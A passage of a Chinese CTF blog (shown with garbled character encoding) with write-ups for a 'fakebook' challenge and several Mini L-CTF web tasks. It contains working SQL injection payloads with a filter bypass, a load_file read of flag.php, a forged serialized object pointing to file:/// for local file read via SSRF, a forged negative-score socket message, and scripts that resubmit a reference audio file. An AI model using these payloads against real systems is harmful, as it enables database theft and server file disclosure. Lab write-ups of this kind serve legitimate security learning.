<p>çœ‹ç½‘ä¸Šçš„wp(<a target="_blank" rel="noopener" href="https://blog.csdn.net/MyZy_/article/details/143814939)%E6%96%B9%E6%B3%95%E5%B0%B1%E6%98%AF%EF%BC%9A">https://blog.csdn.net/MyZy_/article/details/143814939)æ–¹æ³•å°±æ˜¯ï¼š</a><br>å…ˆä¸Šä¼ ä¸€ä¸ªç¬¦åˆè§„åˆ™çš„ä¿¡æ¯ï¼Œç„¶åä½¿ç”¨sqlæ³¨å…¥æŠŠä¿¡æ¯ä¸­åšå®¢urlæ”¹ä¸ºæœ¬åœ°è®¿é—®flag.php<br>æˆ–è€…å› ä¸ºæ²¡è¿‡æ»¤sqlçš„file_load()ï¼Œå¯ä»¥ç›´æ¥è¯»å–flag.php  </p>
<p>é‚£å°±å…ˆç”¨è‡ªå·±çš„githubåœ°å€æ³¨å†Œä¸€æ¡ä¿¡æ¯<br>ç„¶ååœ¨&#x2F;view.php?on&#x3D;1ä¸­è¿›è¡Œæ³¨å…¥<br>ç„¶åå‘ç°ç°åœ¨çš„buuctfå¥½åƒä¸ºäº†é˜²æ­¢é¶æœºå˜æˆè‚‰é¸¡ï¼Œä¸ç»™å‡ºç½‘äº†<br>é‚£æ²¡åŠæ³•ï¼Œå»nssctfä¸Šåšå§  </p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span>&lt;&gt;<span class="hljs-keyword">select</span>&lt;&gt;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--+<br><span class="hljs-comment">//ä¸è¡Œ</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,database()),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!fakebook&#x27;)</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-built_in">tables</span>))),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!users,ALL_PLUGINS,APPLICABLE_RO&#x27;)</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns))),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!no,username,passwd,data,PLUGIN_&#x27;)</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>(group_concat(no,username,passwd,data))<span class="hljs-keyword">from</span>(users))),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!1zhong3c9909afec25354d551dae215&#x27;)</span><br><span class="hljs-comment">//ç»å…¸çš„æŠ¥é”™æ³¨å…¥å›æ˜¾ä¸å®Œå…¨ï¼Œè¿™é‡Œçš„passwdåº”è¯¥æ˜¯å°±æ˜¯è¢«åŠ å¯†è¿‡çš„ï¼Œä¸ç„¶åŸå¯†ç æ˜¯&#x27;123&#x27;</span><br><span class="hljs-comment">//æ³¨æ„çœ‹äº†ä¸€ä¸‹ç½‘ä¸Šçš„wpï¼Œå¥½åƒè¿‡æ»¤äº†&#x27;union select&#x27;,ä½¿ç”¨&#x27;union/**/select&#x27;å¯ä»¥ç»•è¿‡  </span><br><br><span class="hljs-number">1</span> order <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> --<br><span class="hljs-comment">//çŸ¥é“äº†è¡Œåˆ—ä¸º4</span><br><br><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span>/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> --<br><span class="hljs-comment">//çŸ¥é“å›æ˜¾ä½ç½®æ˜¯2</span><br><br><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span>/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(no,<span class="hljs-string">&quot;\n&quot;</span>,username,<span class="hljs-string">&quot;\n&quot;</span>,passwd,<span class="hljs-string">&quot;\n&quot;</span>,data),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> users --<br><span class="hljs-comment">//1 zhong </span><br><span class="hljs-number">3</span>c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2 <br>O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;zhong&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">123</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;http://gwwafz.online/&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>è¿™æ˜¯æ—¶å€™å¦‚wpè¯´çš„ï¼Œåœ¨dataé‡Œæ„é€ ä¸€æ¡è¯»å–æœ¬åœ°flagçš„é“¾æ¥å³å¯  </p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">-<span class="hljs-number">1</span> union/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;zhong&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">123</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27; from users <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
<p>ç½‘é¡µä¼šåœ¨blogçš„åŒºåŸŸå›æ˜¾blogé“¾æ¥çˆ¬å–åˆ°çš„é¡µé¢ï¼Œæ”¹ä¸ºfile:&#x2F;&#x2F;å¯ä»¥ç›´æ¥è®¿é—®æœ¬åœ°çš„flag.phpæºç ï¼Œæ‰€ä»¥åœ¨f12ä¸­æŸ¥çœ‹blogçª—å£å…ƒç´ å³å¯çœ‹ï¼Œå¯èƒ½æ˜¯å®ƒè¿™ä¸ªé¢˜ç›®çš„åŸå› ï¼Œæ­£å¸¸çš„blogä¹Ÿæ— æ³•æ˜¾ç¤º<br>åªèƒ½åœ¨æºç æŸ¥çœ‹äº†  </p>
<p>è§£æ³•äºŒï¼š<br>æ—¶ç”¨sqlçš„load_file()å‡½æ•°ï¼Œç›´æ¥è¯»å–flag.php<br>æ³¨å…¥æ—¶ä¼ å…¥ï¼š  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(&quot;/var/www/html/flag.php&quot;),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>


<h2 id="notice-5"><a href="#notice-5" class="headerlink" title="notice"></a>notice</h2><p>file:&#x2F;&#x2F;&#x2F;<br>ä¸­æ˜¯æœ‰3ä¸ª&#x2F;  </p>
<p>è¿˜æœ‰ï¼Œä¸ºä»€ä¹ˆä¼ å…¥sqlè¯­å¥<br>-1 union&#x2F;**&#x2F;select 1,2,3,â€™O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€zhongâ€;s:3:â€ageâ€;i:123;s:4:â€blogâ€;s:29:â€file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€;}â€™ from users â€“<br>å°±èƒ½è®¿é—®åˆ°flag.php<br>é¦–å…ˆselectè¯­å¥è‹¥æ˜¯æ²¡æœ‰æœç´¢åˆ°ä¸œè¥¿ä¼šè‡ªå·±å˜æˆè‡ªå·±æ·»åŠ çš„æ•°æ®<br>æ‰€ä»¥-1æ²¡æœç´¢åˆ°ï¼Œä¼šç­‰äºè‡ªå·±æ–°å»ºä¸€æ¡æ•°æ®å‘ç»™åç«¯è¯­å¥<br>åŸè¯­å¥ï¼š  </p>
<p>-1 union&#x2F;**&#x2F;select 1,2,3,â€™O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€zhongâ€;s:3:â€ageâ€;i:123;s:4:â€blogâ€;s:29:â€file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€;}â€™ from users â€“</p>
<p>ä¼ å…¥dbådbä¼šå¤„ç†å¥½ç„¶åå°†ç»“æœè¿”å›è¯­å¥ï¼Œå…¶ä¸­union selectå°±ç›¸å½“äºæ–°å»ºäº†ä¸€æ¡sqlæŸ¥è¯¢ç»“æœè¿”å›  </p>
<p>æ‰€ä»¥åç«¯æºç æ¥æ”¶åˆ°çš„sql select æ•°æ®å°±ä¸ºï¼š  </p>
<p>1,2,3,â€™O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€zhongâ€;s:3:â€ageâ€;i:123;s:4:â€blogâ€;s:29:â€file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€;}â€™</p>
<p>ç„¶åå°†å…¶ä¸­dataååºåˆ—åŒ–(çœ‹æºç )åæ‰§è¡Œ<br>å…¶ä¸­1ï¼Œ2ï¼Œ3ä¸ºå¦å¤–3æ¡columnï¼Œæ”¹dataé‚£æ¡columnå³å¯  </p>
<p>ç„¶ååˆšæ‰æ‰«ç›®å½•æ—¶å‘ç°äº†æœ‰ä¸ª<br>db.php<br>å¯ä»¥çŒœæµ‹å­˜åœ¨æ•°æ®åº“ï¼Œæ‰€ä»¥å¯¹noè¿›è¡Œæ³¨å…¥å°è¯•   </p>
<p><strong>ssrfæ¼æ´ï¼š</strong><br>æˆ‘è§‰å¾—æ˜¯<br>åˆ©ç”¨ç½‘ç«™å¯¹å¤–è®¿é—®æ¥è¿›è¡Œæ”»å‡»<br>æ¯”å¦‚è¿™é¢˜æœ‰curlç±»çš„å‡½æ•°  </p>
<p>çœ‹nssctfçš„æ ‡ç­¾æœ‰ssrf<br>ç¬¬ä¸€æ¬¡åšssrfçš„é¢˜ç›®  </p>
<hr>
<h2 id="title-note-34date-2025-05-11-01-37-11tags-web"><a href="#title-note-34date-2025-05-11-01-37-11tags-web" class="headerlink" title="title: note-34date: 2025-05-11 01:37:11tags: web"></a>title: note-34<br>date: 2025-05-11 01:37:11<br>tags: web</h2><h1 id="Mini-L-CTF-GuessOneGuess"><a href="#Mini-L-CTF-GuessOneGuess" class="headerlink" title="Mini L-CTF GuessOneGuess"></a>Mini L-CTF GuessOneGuess</h1><p>ä¸‹è½½æºç   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs php">module.exports = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">io</span>) </span>&#123;<br>    io.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, (socket) =&gt; &#123;<br>        let targetNumber = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>        let guessCount = <span class="hljs-number">0</span>;<br>        let totalScore = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.env.FLAG || <span class="hljs-string">&quot;miniL&#123;THIS_IS_THE_FLAG&#125;&quot;</span>;<br>        console.<span class="hljs-title function_ invoke__">log</span>(`æ–°è¿æ¥ - ç›®æ ‡æ•°å­—: $&#123;targetNumber&#125;`);<br><br>    <br>        socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;welcome&#x27;</span>,<br>            <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;çŒœä¸€ä¸ª1-100ä¹‹é—´çš„æ•°å­—ï¼&#x27;</span>,<br>            <span class="hljs-attr">score</span>: totalScore<br>        &#125;);<br><br>        <br>        socket.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">&#x27;guess&#x27;</span>, (data) =&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>              console.<span class="hljs-title function_ invoke__">log</span>(totalScore);<br>                <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">guess</span> = <span class="hljs-title function_ invoke__">parseInt</span>(data.value);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">isNaN</span>(guess)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥æœ‰æ•ˆæ•°å­—&#x27;</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (guess &lt; <span class="hljs-number">1</span> || guess &gt; <span class="hljs-number">100</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;è¯·è¾“å…¥1-100ä¹‹é—´çš„æ•°å­—&#x27;</span>);<br>                &#125;<br><br>                guessCount++;<br><br>                <span class="hljs-keyword">if</span> (guess === targetNumber) &#123;<br>                   <br>                    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">currentScore</span> = Math.<span class="hljs-title function_ invoke__">floor</span>(<span class="hljs-number">100</span> / Math.<span class="hljs-title function_ invoke__">pow</span>(<span class="hljs-number">2</span>, guessCount - <span class="hljs-number">1</span>));<br>                    totalScore += currentScore;<br><br>                    let message = `ğŸ‰ çŒœå¯¹äº†ï¼å¾—åˆ† +$&#123;currentScore&#125; (æ€»åˆ†æ•°: $&#123;totalScore&#125;)`;<br>                    let showFlag = <span class="hljs-literal">false</span>;<br><br>                    <span class="hljs-keyword">if</span> (totalScore &gt; <span class="hljs-number">1.7976931348623157e308</span>) &#123;<br>                        message += `\nğŸ´ $&#123;FLAG&#125;`;<br>                        showFlag = <span class="hljs-literal">true</span>;<br>                    &#125;<br><br>                    socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>                        <span class="hljs-attr">win</span>: <span class="hljs-literal">true</span>,<br>                        <span class="hljs-attr">message</span>: message,<br>                        <span class="hljs-attr">score</span>: totalScore,<br>                        <span class="hljs-attr">showFlag</span>: showFlag,<br>                        <span class="hljs-attr">currentScore</span>: currentScore<br>                    &#125;);<br><br>                    <br>                    targetNumber = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>                    console.<span class="hljs-title function_ invoke__">log</span>(`æ–°ç›®æ ‡æ•°å­—: $&#123;targetNumber&#125;`);<br>                    guessCount = <span class="hljs-number">0</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (guessCount &gt;= <span class="hljs-number">100</span>) &#123;<br>                      console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;100æ¬¡æœªçŒœä¸­ï¼å°†æ‰£é™¤å½“å‰åˆ†æ•°å¹¶é‡ç½®&quot;</span>);<br>                        socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;punishment&#x27;</span>, &#123;<br>                            <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;100æ¬¡æœªçŒœä¸­ï¼å°†æ‰£é™¤å½“å‰åˆ†æ•°å¹¶é‡ç½®&quot;</span>,<br>                        &#125;);<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>                        <span class="hljs-attr">win</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">message</span>: guess &lt; targetNumber ? <span class="hljs-string">&#x27;å¤ªå°äº†ï¼&#x27;</span> : <span class="hljs-string">&#x27;å¤ªå¤§äº†ï¼&#x27;</span>,<br>                        <span class="hljs-attr">score</span>: totalScore<br>                    &#125;);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>                socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;error&#x27;</span>,<br>                    <span class="hljs-attr">message</span>: err.message,<br>                    <span class="hljs-attr">score</span>: totalScore<br>                &#125;);<br>            &#125;<br>        &#125;);<br>        socket.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">&#x27;punishment-response&#x27;</span>, (data) =&gt; &#123;<br>          totalScore -= data.score;<br>          guessCount = <span class="hljs-number">0</span>;<br>          targetNumber = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>          console.<span class="hljs-title function_ invoke__">log</span>(`æ–°ç›®æ ‡æ•°å­—: $&#123;targetNumber&#125;`);<br>          socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>            <span class="hljs-attr">win</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;æ‰£é™¤åˆ†æ•°å¹¶é‡ç½®&quot;</span>,<br>            <span class="hljs-attr">score</span>: totalScore,<br>            <span class="hljs-attr">showFlag</span>: <span class="hljs-literal">false</span>,<br>          &#125;);<br><br>        &#125;);<br>    &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure>
<p>æ³¨æ„åˆ°æœ€åæœ‰ä¸€é¡¹çŒœé”™ä¸€ç™¾æ¬¡ååˆ é™¤åˆ†æ•°çš„å‡½æ•°<br>è¿™ä¸ªåˆ†æ•°æ˜¯data,ä¸ºä¸Šä¼ çš„data  </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">totalScore -<span class="hljs-operator">=</span> data.score<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªè´Ÿæ•°ï¼Œæ ¹æ®æºç é‡Œçš„å‡å»ï¼Œå°±èƒ½å®ç°è´Ÿè´Ÿå¾—æ­£ï¼Œè·å¾—è¶³å¤Ÿåˆ†æ•°<br>ä¹‹åçš„totalScoreæ˜¯è¶³å¤Ÿåˆ†æ•°æ¥è¾“å‡ºflagçš„<br>æ­¤æ—¶å†çŒœå¯¹ä¸€æ¬¡è§¦å‘è¾“å‡ºflagå³å¯  </p>
<p>æ“ä½œè¿‡ç¨‹ï¼š<br>è¾“å…¥1 ç„¶åbpæŠ“åŒ…é‡å‘99æ¬¡ï¼Œ<br>åœ¨99æ¬¡æ—¶æŠŠä¸Šä¼ çš„åˆ†æ•°æ”¹ä¸ºï¼š  </p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-symbol">&#x27;42</span>[<span class="hljs-string">&quot;punishment-response&quot;</span>,&#123;<span class="hljs-string">&quot;score&quot;</span>:-1e309&#125;]&#x27;<br></code></pre></td></tr></table></figure>
<p>æ­¤æ—¶æœåŠ¡å™¨é‡Œçš„æ•°ç»„å·²ç»è¾¾åˆ°å‘é€flagçš„æ•°å€¼äº†ï¼Œä½†æ˜¯è¦è§¦å‘åˆ†æ•°æ£€æµ‹ç„¶åè¾“å‡ºflagéœ€è¦çŒœå¯¹ä¸€æ¬¡ï¼Œ<br>æ‰€ä»¥å†çŒœå¯¹ä¸€æ¬¡å³å¯  </p>
<p>å®æµ‹ç›´æ¥ä½¿ç”¨punishmentäº‹ä»¶å°±å¯ä»¥ç›´æ¥ä¸Šä¼ åˆ†æ•°äº†<br>ä¸ç”¨é”™ä¸€ç™¾æ¬¡  </p>
<h1 id="Mini-L-CTF-éº¦éœ¸è¯„åˆ†"><a href="#Mini-L-CTF-éº¦éœ¸è¯„åˆ†" class="headerlink" title="Mini L_CTF éº¦éœ¸è¯„åˆ†"></a>Mini L_CTF éº¦éœ¸è¯„åˆ†</h1><p>é¢˜ç›®ç»™äº†æºç <br>çœ‹åˆ°æºç é‡Œæœ‰è·å–åŸéŸ³é¢‘çš„åœ°å€ï¼š<br>&#x2F;original.wav  </p>
<p>æäº¤å½•éŸ³çš„åœ°å€ï¼š<br>&#x2F;compare-recording  </p>
<p>é‚£ç›´æ¥æŠŠåŸéŸ³æäº¤å³å¯  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 1. ç›´æ¥è¯·æ±‚åŸç‰ˆéŸ³é¢‘ï¼ˆæ›¿æ¢ä¸ºå®é™…éŸ³é¢‘è·¯å¾„ï¼‰</span><br>audio_url = <span class="hljs-string">&quot;http://127.0.0.1:37563/original.wav&quot;</span>  <span class="hljs-comment"># </span><br>audio = requests.get(audio_url).content<br><br><span class="hljs-comment"># 2. ä¼ªè£…æˆç”¨æˆ·å½•éŸ³æäº¤</span><br>r = requests.post(<br>    <span class="hljs-string">&quot;http://127.0.0.1:37563/compare-recording&quot;</span>, <span class="hljs-comment"># </span><br>    files=&#123;<span class="hljs-string">&quot;audio&quot;</span>: (<span class="hljs-string">&quot;recording.wav&quot;</span>, audio)&#125;<br>)<br>a=requests.get(audio_url).headers<br><br><span class="hljs-comment"># 3. æå–flag</span><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<p>ç»™deepseekä¸€çœ¼é¡¶é’ˆäº†ï¼Œåœ¨æµè§ˆå™¨æ§åˆ¶å°è¿è¡Œå°±è¡Œï¼š  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getFlag</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// æ›¿æ¢æˆä¸Šä¸€æ­¥è·å–çš„çœŸå®URLï¼ˆç¤ºä¾‹ï¼š/original.wav?sign=abc123ï¼‰</span><br>  <span class="hljs-keyword">const</span> serverPath = <span class="hljs-string">&#x27;/original.wav?sign=abc123&#x27;</span>; <br><br>  <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨æœåŠ¡å™¨è·¯å¾„è·å–éŸ³é¢‘</span><br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(serverPath);<br>  <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">blob</span>();<br><br>  <span class="hljs-comment">// æäº¤åˆ°è¯„åˆ†æ¥å£</span><br>  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();<br>  formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;audio&#x27;</span>, blob, <span class="hljs-string">&#x27;recording.wav&#x27;</span>);<br>  <br>  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/compare-recording&#x27;</span>, &#123; <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-attr">body</span>: formData &#125;);<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();<br>  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">flag</span>) <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;FLAG: &#x27;</span> + data.<span class="hljs-property">flag</span>);<br>&#125;<br><br><span class="hljs-comment">// æ·»åŠ å†·å´æ—¶é—´ç»•è¿‡</span><br><span class="hljs-built_in">setTimeout</span>(getFlag, <span class="hljs-number">11000</span>); <span class="hljs-comment">// ç­‰å¾…11ç§’åæ‰§è¡Œ</span><br></code></pre></td></tr></table></figure>
<h1 id="Mini-L-CTF-åƒè±†äºº"><a href="#Mini-L-CTF-åƒè±†äºº" class="headerlink" title="Mini L-CTF åƒè±†äºº"></a>Mini L-CTF åƒè±†äºº</h1><p>æŸ¥çœ‹æºç ï¼Œå¾—åˆ°ä¸Šä¼ çš„åœ°å€ï¼Œ<br>ç›´æ¥ä¼   </p>
